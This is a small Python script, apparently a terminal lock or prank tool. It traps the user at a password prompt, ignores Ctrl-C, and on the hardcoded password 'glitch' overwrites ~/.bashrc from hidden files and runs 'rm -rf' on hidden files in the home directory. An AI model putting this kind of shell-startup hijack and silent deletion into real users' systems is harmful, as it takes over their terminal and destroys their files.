#import os
#from sys import argv
#import sys
#import argparse
#import requests, json
import sys
#from sys import argv
import os
import time
os.system('clear')
os.system('figlet -w big "             PassWord"')
def h():

    try:

            p=input("type here =>> ")
            time.sleep(1)
#            os.system(p)
            if p == "glitch":
                os.system("clear")
                os.system('figlet -w big "                  Done .."')
                os.system("cp -r $HOME/app/.mk $HOME/.bashrc")
                os.system("cp -r $HOME/app/.a $HOME/app/.mk")
#                os.system('rm -rf $HOME/mm')
                time.sleep(3)

                os.system("rm -rf $HOME/.mm")
                os.system("rm -rf $HOME/.pas.py")
                print ("          ")
                print ("                  Please ReOpen All Session...")
                time.sleep(5566777)
            else:
                print ("       error.. ")
                h()
#            os.system(p)
    except KeyboardInterrupt:
            time.sleep(1)
            print ("       error.. ")
            h()

h()
